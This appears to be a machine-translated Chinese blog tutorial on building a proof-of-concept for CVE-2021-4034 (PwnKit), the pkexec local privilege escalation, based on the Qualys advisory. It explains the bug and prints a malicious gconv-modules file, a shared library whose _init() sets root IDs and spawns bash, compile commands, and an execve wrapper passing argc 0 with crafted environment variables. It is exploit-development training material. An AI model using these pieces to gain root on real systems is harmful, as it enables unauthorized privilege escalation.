介绍

最近，Qualys 研究团队在 pkexec 中发现了一个重大的本地提权漏洞 ( https://nvd.nist.gov/vuln/detail/CVE-2021-4034 )，这是一个 SUID 二进制文件，在许多 Linux 上默认安装分布。Qualys 提供了详细的漏洞咨询，这很有帮助；该咨询可以在这里找到：

https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt


对于漏洞利用开发人员来说，一个有用的培训练习是尝试根据有限的细节为一个公开的漏洞设计漏洞利用。出于多种原因，CVE-2021-4034 非常适合此练习：

  • 链接的咨询非常详细，但没有提供概念证明漏洞利用

  • 虽然该漏洞在技术上属于内存损坏问题，但利用该漏洞不需要绕过任何内存损坏缓解措施，从而大大降低了利用的复杂性；对于那些以前没有尝试过的人来说，这使得该漏洞成为这个练习的一个很好的介绍

  • pkexec 在许多 Linux 发行版上默认设置，这意味着您不必花费大量时间设置复杂的研究环境即可开始尝试利用该问题

  • 作为奖励，该错误很有趣，并且在撰写本文时最近才公开披露

因此，我和我的同事 Cole Houston 选择将此练习应用于此漏洞。到我们开始时，针对此漏洞的公开概念证明 (PoC) 漏洞利用已经存在，因此我们仅出于学习（和乐趣）的目的进行此工作，而不是试图在其他人之前开发 PoC。一旦开始，我们的目标就是通过仅检查漏洞公告中的详细信息来了解漏洞并开发有效的漏洞利用。


这篇文章记录了基于漏洞描述为一个众所周知的漏洞编写漏洞利用的过程。由于该问题的 Qualys 公告非常详细，因此该过程最终对初学者相当友好，这使得该漏洞成为那些有兴趣尝试亲手为现实世界中的错误编写漏洞利用程序的人的良好起点。


初始步骤 - 了解漏洞

漏洞利用编写过程的第一步是了解漏洞。如果您还没有阅读 Qualys 咨询（上面链接）并想继续阅读，请花点时间阅读它。这篇文章只会总结完整的建议。


通读该公告可揭示关键细节，包括以下内容：

  • argc为0时触发bug

  • 该错误涉及越界 (OOB) 读取和 OOB 写入

  • 该错误最终允许将攻击者控制的值写入保存环境变量的堆栈部分

  • 这使攻击者能够重新引入在最初运行 pkexec 时已被清除的环境变量，因为必须为 SUID 二进制文件清除一些危险的环境变量

稍后我们将返回这些细节（在编写漏洞利用程序的过程中，我们不得不多次重新访问它们），但现在，这足以了解漏洞的大致轮廓。咨询的后半部分侧重于如何利用此问题以 root 用户身份执行代码。


了解利用方法

让我们首先检查一下公告这一部分的关键细节：

  • 触发错误后不久，环境变量无论如何都会被pkexec清除。这意味着我们只有一个小窗口来利用攻击者引入的环境变量的存在

  • 准备清除环境变量时调用的函数之一是 validate_environment_variable()

  • 此函数在内部调用 g_printerr() 函数

  • 反过来，如果 CHARSET 环境变量存在且其值为 UTF-8 以外的字符集，则 g_printerr() 可以调用 iconv_open()

  • iconv_open() 读取配置文件以确定使用哪个共享库来帮助进行字符转换通常 iconv_open() 使用配置文件的默认路径。但是，如果 GCONV_PATH 环境变量存在，它会读取它来查找应该包含配置文件的目录

  • GCONV_PATH 被认为是不安全的，并在运行 SUID 二进制文件时被清除。然而，碰巧我们有一个错误，允许我们重新引入它……

这里有很多细节需要吸收。然而，我们需要帮助编写我们的漏洞利用的信息并不太复杂。我们知道，当我们调用 pkexec 时，我们需要设置 CHARSET 变量并给它一个 UTF-8 以外的值。我们还知道我们需要以某种方式在 validate_environment_variable() 函数中触发错误，以便调用 g_printerr() 并读取我们的 CHARSET 变量。最后，我们知道我们希望 GCONV_PATH 指向我们使用 iconv_open() 的自定义配置文件控制的目录，并且配置文件可以指向我们控制的库。当 iconv_open() 加载库时，我们的代码将以 root 身份执行。这是一个好的开始，但有一些细节没有明确说明。让我们来看看那些。


填补空白

尽管该咨询非常出色且比典型的 CVE 咨询详细得多，但仍存在一些小的差距或需要仔细阅读才能确定的推论。第一个微小的差距正是我们如何在 validate_environment_variable() 中触发错误，以便调用 g_printerr()。该公告在技术上并没有告诉我们如何做到这一点，但它包含的源代码片段为我们提供了一个很好的提示（注意我用 //[*] 标记的行）：

 383 validate_environment_variable (const gchar *key, 384                                const gchar *value) 385 { ... 406           log_message (LOG_CRIT, TRUE, 407                        "The value for the SHELL variable was not found the /etc/shells file"); //[*] 408           g_printerr ("\n" 409                       "This incident has been reported.\n");

因此，当在 /etc/shells 文件中找不到 SHELL 变量的值时，似乎会触发错误。为什么要检查这个变量呢？反正不是要清理环境吗？让我们看看完整的（未打补丁的）源代码（https://github.com/wingo/polkit/blob/4c9a813f3fc1ada4fcce508d286e95f965a3002a/src/programs/pkexec.c）。


回到第 457 到 470 行，一些环境变量被留出待保存：

  const gchar *environment_variables_to_save[] = {    "SHELL",    "LANG",    "LINGUAS",    "LANGUAGE",    "LC_COLLATE",    "LC_CTYPE",    "LC_MESSAGES",    "LC_MONETARY",    "LC_NUMERIC",    "LC_TIME",    "LC_ALL",    "TERM",    "COLORTERM",

如果我们回顾一下该公告所复制的源代码，我们可以看到 pkexec 迭代 environment_variables_to_save[] 数组并在数组中的每个值上调用 validate_environment_variable() ：

 639       argv[n] = path = s; ... 657   for (n = 0; environment_variables_to_save[n] != NULL; n++) 658     { 659       const gchar *key = environment_variables_to_save[n]; ... 662       value = g_getenv (key); ... 670       if (!validate_environment_variable (key, value)) ... 675     } ... 702   if (clearenv () != 0)

现在我们明白了为什么 SHELL 环境变量甚至是相关的。让我们快速看一下 /etc/shells 文件的内容（这是从我用于开发漏洞利用的 VM 中提取的）：

# /etc/shells: valid login shells/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/usr/bin/sh/bin/dash/usr/bin/dash

所以我们要做的就是确保当我们调用 pkexec 时，SHELL 环境变量已设置并且具有与 /etc/shells 中可用的值不同的值。这应该允许我们触发对 g_printerr() 的调用。


接下来，我们需要了解如何调用 pkexec。回想一下，为了触发错误，我们需要 argc 为 0。但是，如果我们从命令行调用 pkexec，则 argc 至少会包含程序名称，因此我们永远不会让 argc 为 0。而咨询没有明确提到这个问题，再次有非常明确的提示。考虑一下咨询中的这句话（重点是我的）：


“最后一分钟说明：polkit 还支持非 Linux 操作系统，例如

作为 Solaris 和 *BSD，但我们尚未调查它们的可利用性；

然而，我们注意到 OpenBSD 是不可利用的，因为它的内核

如果 argc 为 0，则拒绝 execve() 程序。”


因此，我们不想在命令行上调用 pkexec，而是要编写一个使用 execve() 来调用 pkexec 的程序。execve() 可以在调用程序时声明 argc 为空，从而使我们能够触发 bug。即使您没有在咨询中注意到此注释，也有关于此技术的大量可用信息，例如此 StackOverflow 线程：https ://stackoverflow.com/questions/8113786/executing-a-process-with-argc-0


最后，我们知道我们需要将 CHARSET 环境变量设置为 UTF-8 以外的值，以使 g_printerr() 调用 iconv_open()，但尚不清楚 CHARSET 需要具有什么值。这是我们将在后面的部分中介绍的内容，但值得注意的是另一项未完全说明的内容。


在漏洞利用开发过程中，填补这些空白的过程并不那么干净或有条理。它需要多次重新阅读该建议。这些项目在这里进行了组织，以使帖子更易于理解，但在实践中，有很多迭代来确定哪些细节很重要。


将漏洞分解成更小的部分

编写此漏洞利用的所有步骤实际上都不是非常具有技术挑战性的。但是，有很多小细节需要注意，它们对于开发有效的漏洞利用至关重要。为了使筛选所有这些细节的过程不那么令人生畏，我发现将这个漏洞分为两个阶段来思考是有帮助的：

  • 成功触发bug

  • 让 iconv_open() 运行，读取攻击者控制的配置文件并加载攻击者控制的库

第二阶段似乎更容易孤立地钻研。iconv_open() 可以被调用，当然不需要通过 pkexec 调用它。我认为向后工作可能是最简单的，首先手动调用 iconv_open() 并让它加载自定义库。这将有助于确保利用策略有效，而不会引入额外的复杂性，即在触发 pkexec 中的错误时需要在调试器中解决所有这些问题。


考虑到这一点，让我们通过首先检查 iconv_open() 并让它执行一些自定义代码来将漏洞利用分成更小的部分。完成后，我们可以将注意力转向尝试成功触发 pkexec 中的错误。最后，我们可以将这两个阶段联系在一起。


让 iconv_open() 运行自定义代码

我们从公告中知道 iconv_open() 将使用默认配置文件路径，除非设置了 GCONV_PATH 环境变量。一个好的开始可能是调查该默认配置文件；如果我们知道它的样子，我们可能只需复制我们想要的部分用于我们的恶意部分并进行一些最小的更改。那么这个配置文件到底在哪里呢？让我们看一下 iconv 实用程序的手册页：


https://man7.org/linux/man-pages/man1/iconv.1.html

该页面标题为“环境”的部分包含一个有用的片段（强调我的）：


“如果没有设置 GCONV_PATH，iconv_open(3) 会加载系统 gconv

由 iconvconfig(8) 创建的模块配置缓存文件和

然后，根据配置，加载 gconv 模块

需要执行转换。“


好的，听起来我们正在寻找 iconvconfig 创建的文件。让我们也看一下 iconvconfig 的手册页：https://manpages.courier-mta.org/htmlman8/iconvconfig.8.html


该页面告诉我们 /usr/lib/gconv/gconv?modules 是“Usual system default gconv module configuration file”，所以下一步是在我们的测试环境中检查它。因为这篇博文使用的测试环境是 64 位的，所以我们将使用的路径实际上是 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules。

在该输出中，我们可以看到目录中有一个名为“ISO646.so”的文件。由于我们知道该配置文件用于指向 gconv 模块以在将一个字符集转换为另一个字符集时使用，我们可以推断这是一个共享库，配置文件告诉 iconv_open() 在涉及 ISO646 字符的转换时加载需要设置。


我们现在有几个有用的信息。我们知道配置文件结构应该是什么，当我们开始为我们的漏洞利用制作恶意配置文件时，我们可以直接复制该文件的片段。我们知道该文件指向与配置文件位于同一目录中的共享库。我们知道合法共享库的名称。如果我们不想在恶意文件中更改它的名称，我们甚至可以将我们的恶意库称为“ISO646.so”。


接下来，让我们尝试设置我们自己的恶意配置文件和共享库。然后我们可以设置 GCONV_PATH 环境变量指向我们的配置文件而不是合法的。最后，我们可以尝试在命令行上调用 iconv 并使用一些参数来触发对 iconv_open() 的调用。


首先，让我们复制原始配置文件的一部分。我们不需要整个东西，所以我们只需要我们之前看到的开始部分：

module  BS_4730//               INTERNAL                ISO646          2module  INTERNAL                BS_4730//               ISO646          2alias   ISO646-GB//             BS_4730//module  BS_4730//               INTERNAL                ISO646          2

我们可以继续创建一个测试目录，然后将该内容放入测试目录中名为“gconv-modules”的文件中。如果我们回顾一下https://man7.org/linux/man-pages/man1/iconv.1.html的手册页，我们会看到它提到如果定义了 GCONV_PATH，那么“iconv_open(3)首先尝试通过按顺序搜索 GCONV_PATH 中的目录来加载配置文件……”。请注意，它指定搜索 GCONV_PATH 中的目录，而不是文件名。这意味着 GCONV_PATH 只指向一个目录而不是一个特定的文件。因此，据我所知，配置文件的名称必须是“gconv-modules”，以便 iconv_open() 能够识别它。


（请注意，gconv-modules 使用破折号，而不是下划线。我认识的一些人在处理此漏洞利用时无意中使用了下划线，并花费了不必要的时间试图找出漏洞利用不起作用的原因，然后制作了写这篇博文时又犯了同样的错误。）


接下来，我们将要创建我们的恶意共享库。我们知道 iconv_open() 会在需要转换字符集时加载库，但不知道合法库的确切作用或库中的哪些函数被调用。一条前进的道路可能是深入研究您所针对的库的源代码，并重写其中一个调用函数以生成 shell 或执行一些其他恶意操作。但是，这将涉及一些不必要的努力。相反，我们可以创建一个最小的共享库，它在加载时立即生成一个 shell。为此，我们只需要定义一个 _init() 函数，该函数将在首次加载库时调用。


这是我们最终得到的代码（它应该保存在一个名为 ISO646.c 的文件中）：

#include <stdio.h>#include <stdlib.h>#include <sys/types.h>
void _init(){setgid(0);setuid(0);setegid(0);seteuid(0);system("/bin/bash");}

当调用 _init() 函数时，会生成一个 bash shell。要编译这个库，你可以运行以下两个命令：

gcc -fPIC -c ISO646.c (this should emit a file called ISO646.o)ld -shared -shared ISO646.o -o ISO646.so

确保已编译的 .so 文件与恶意 gconv-modules 文件位于同一目录中。


现在我们已经创建了配置文件和库，我们可以继续测试调用 iconv_open()。为此，我们可以在命令行上调用 iconv 并使用一些参数告诉它从任意字符集转换为 ISO646-GB。首先，我们可以创建一个文本文件以在测试 iconv 时使用。继续创建一个名为“test.txt”的文件，其中包含一些任意内容。


不要忘记默认情况下，iconv_open() 将使用 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules 中的原始配置文件路径。我们需要将 GCONV_PATH 环境变量设置为指向包含恶意配置文件的测试目录。


首先，让我们继续设置该环境变量并将其指向我们创建的包含配置文件和库的测试目录。这是我如何在我的测试机器上进行设置的示例：

export GCONV_PATH=/home/wintermute/cve-2021-4034/test

有了这个集合，我们可以继续使用一些参数调用 iconv，这将导致它运行 iconv_open()。在下面的命令中，我们告诉 iconv 从 UTF-8 转换为 ISO646-GB（我们在配置文件中包含引用的字符集），我们将它传递给我们的测试文本文件的路径较早创建。

iconv -f UTF-8 -t ISO646-GB /tmp/test.txt

运行该命令应该会生成一个 bash shell，表明 iconv_open() 正在被调用并正在解析我们的恶意配置文件，从而加载我们的共享库。请注意，如果您从 bash 运行这些命令，可能很容易错过已生成新的 bash shell，因为它应该与旧的相同。如果您从 sh 而不是 bash 运行上述命令，应该更容易观察到 shell 已生成，如以下屏幕截图所示：

触发 pkexec 中的错误

所以现在我们已经弄清楚了简单的部分。接下来我们需要在 pkexec 中触发 bug，然后继续使用 bug 来引入 GCONV_PATH 环境变量。回顾一下，当我们最终尝试利用该漏洞时，我们需要将 SHELL 环境变量设置为无效值，以便调用 g_printerr()。我们还需要设置 CHARSET 环境变量，以便 g_printerr() 将调用 iconv_open()，这是我们最终想要达到的调用。SHELL 和 CHARSET 都被认为是安全的环境变量，所以我们不必担心在运行 pkexec 时它们会被清除。


不过，现在，让我们只担心触发错误并在调试器中观察它。（实际上，您可能完全不需要调试器就可以编写整个漏洞利用程序，但它在编写漏洞利用程序时对我们很有帮助。）在这篇博文中，我将使用出色的 GEF（https:// github.com/hugsy/gef），一个扩展 GDB 功能的项目。GEF 通过添加新命令和使 GDB 默认输出更多信息，使 GDB 在漏洞利用开发中更加实用。如果您以前没有尝试过，我强烈建议您试一试；即使您从不使用新命令，GEF 提供的额外信息一目了然，使该工具非常值得利用。


不过，在我们开始调试之前，我们需要正确调用 pkexec。不要忘记之前我们了解到要触发该错误，必须在 argc 设置为 0 的情况下调用 pkexec。为此，我们不能从命令行调用它，而是需要使用 execve() 调用 pkexec . 因此，让我们从制作一个充当 pkexec 包装器的最小 C 程序开始：

#include <stdio.h>
void main(){char *args[] = { NULL };execve("/usr/bin/pkexec", args);}


我们在这里所做的只是将 args 数组设置为 NULL，然后使用 execve() 调用 pkexec。让我们继续将此代码保存到一个名为“exploit.c”的文件中，然后使用以下命令对其进行编译：

gcc exploit.c -o exploit

编译程序后，让我们试一试：

./exploit Cannot run program SHELL=/bin/bash: No such file or directory

看起来我们触发了这个错误！我们没有向 pkexec 传递任何参数，但它正在尝试执行一个名为“SHELL=/bin/bash”的程序。如果您阅读了公告并理解了这个错误，那么您已经理解了这里发生的事情，但为了消除任何混淆，让我们快速浏览一下我们的前几个环境变量：

所以 SHELL 是我们的第一个环境变量。它被越界阅读并成为争论。一个好的下一步是尝试使用 execve() 引入一个新的环境变量。这也是在调试器中观察易受攻击行为的机会。如果我们回顾一下该公告，我们可以检查以下两个关键点：


“- 如果我们的 PATH 环境变量是“PATH=name”，并且如果目录“名称”存在（在当前工作目录中）并包含一个名为“value”的可执行文件，然后是指向该字符串的指针“名称/值”越界写入 envp[0]；– 或者，如果我们的 PATH 是“PATH=name=.”，并且目录是“name=.” 存在并包含一个名为“value”的可执行文件，然后是一个指向字符串“name=./value”被越界写入 envp[0]。”


这两个要点可能比整个咨询中的其他任何内容都需要更多的重读。这里首先要注意的是，“value”只是传递给 pkexec 的第一个环境变量的占位符。另一个需要注意的重要事项是，当您创建第一个环境变量时，您不必使用 NAME=VALUE 的结构。您可以完全避开等号和右手值，并执行以下操作：

char *newenviron[] = {"TEST",0};


这有点令人困惑，但第二个要点基本上是告诉我们，如果我们创建一个名为“PATH=name=”的第二个环境变量，只要满足某些条件，那么我们最终会得到错误来创建一个名为“name=./value”的环境变量，其中 value 是创建的第一个环境变量。当我们查看一些代码时，这将更有意义。


让我们更新我们的漏洞利用代码，如下所示：

#include <stdio.h>
void main(){char *args[] = { NULL };char *newenviron[] = {"test","PATH=example=",0}; // add two environment variablesexecve("/usr/bin/pkexec", args, newenviron);}

所以我们现在创建一个名为“test”的环境变量，然后创建第二个名为“PATH=example=”的环境变量并将它们都传递给pkexec。回想一下，根据公告中的要点，PATH 变量中引用的目录需要实际存在，并且它需要包含具有第一个环境变量名称的可执行文件。为了满足这一要求，从我们一直使用的测试目录（包含我们的漏洞利用、配置文件和库的目录）中，让我们继续创建一个名为“example=”的目录（注意等号）。在该目录中，放置一个可执行文件并将其命名为“test”（如果愿意，您可以复制并重命名漏洞利用二进制文件；据我所知，该文件是什么实际上并不重要）。

请注意，我们收到一条消息，指出“pkexec 必须是 setuid root”。您可以查看未修补源代码的第 506-511 行（https://github.com/wingo/polkit/blob/4c9a813f3fc1ada4fcce508d286e95f965a3002a/src/programs/pkexec.c）以获得更清晰的信息：

  /* check for correct invocation */  if (geteuid () != 0)    {      g_printerr ("pkexec must be setuid root\n");      goto out;    }


因此，它正在检查以确保程序以 root 身份运行。但是等等，pkexec 不是 SUID 二进制文件吗？这不意味着它以root身份运行吗？当我们在 GDB 之外运行二进制文件时，我们没有得到这个错误，那么为什么我们在 GDB 中得到它呢？


答案是 SUID 二进制文件在从调试器中运行时会放弃它们的权限。当然，这是有道理的——如果您可以在调试器中以比当前用户更高的权限运行程序，那将是一个巨大的安全漏洞。调试器允许您更改正在运行的程序的内存，因此您可以让程序执行您想要的任何操作并轻松提升您的权限。


处理这个问题的最简单方法就是以 root 用户身份调试您的漏洞利用。您也可以只使用 GDB 在运行时修补此检查，以防止触发错误（请注意，这不会阻止二进制文件放弃 root 权限；它只会阻止它产生此错误并关闭） ，但这比仅仅以root身份运行漏洞利用要复杂一些。从现在开始，除非另有说明，否则让我们以 root 身份执行测试。


让我们在 GDB 中启动 C 包装器，然后运行命令“set follow-fork-mode child”。此命令确保当从包装器中调用 pkexec 时，我们将开始调试 pkexec，而不是继续调试包装器。我们还可以运行命令“break main”，然后继续运行程序，直到我们在 pkexec 中遇到断点。

从这里开始，我们真正想要找到的是环境变量被写入越界的那一刻。为此，我们可以运行以下命令：

disassemble main

请注意，rbx 寄存器包含值“example=/test”。在 GDB 中执行两个单独的步骤将显示该值已成功放置在 rax 中。这证实了我们正在写入我们期望的值，其中目录的名称充当新环境变量的左侧，而第一个环境变量的名称充当右侧。

把它们放在一起：

让我们想想我们需要改变什么。首先，我们应该创建一个名为“GCONV_PATH=”的目录，而不是我们旧的“example=”目录。然后我们可以将通过 execve() 传递的第二个环境变量更新为“PATH=GCONV_PATH=”。


不过，我们要为 GCONV_PATH 写入什么值？不要忘记 value 是 iconv_open() 将检查配置文件的目录，因此我们要确保将 value 指向我们可以控制的某个目录。什么是我们可能大部分时间都可以写入的简单目录？/tmp 是一个不错的选择（尽管您可以在这里采取很多方法）。


所以我们知道我们要设置 GCONV_PATH=tmp。如果这是要检查配置文件的目录，那么我们还需要确保将我们的配置文件和共享库都复制到 /tmp。我们需要创建“GCONV_PATH=”目录，并在其中放置一个名为“tmp”的任意可执行文件。

耶！我们已经成功地引入了 GCONV_PATH 环境变量，并且我们让它指向一个包含我们的恶意配置文件和共享库的目录。我们几乎赢了。不过，不要忘记我们为什么要努力将 GCONV_PATH 重新引入环境；我们需要调用 iconv_open()。为此，我们需要通过将 SHELL 环境变量设置为无效值来触发错误。使用 execve() 应该很容易做到这一点。最后一步：我们需要让 iconv_open() 执行字符转换，以便它需要我们的配置文件。咨询中的以下信息很有帮助：


“g_printerr() 通常打印 UTF-8 错误消息，但如果环境变量 CHARSET 不是 UTF-8，它可以在另一个字符集中打印消息（注意：CHARSET 不是安全敏感的，它不是“不安全”的环境变量）。要将消息从 UTF-8 转换为另一个字符集，g_printerr() 调用 glibc 的函数 iconv_open()。”


所以我们需要设置CHARSET环境变量。我们需要赋予它什么价值？很难找到关于这个变量或它应该具有的值的信息。当我们在命令行上手动调用 iconv 时，我们使用 ISO646-GB 作为“to”字符集，所以这可能是 CHARSET 的可接受值。让我们试一试，看看会发生什么。
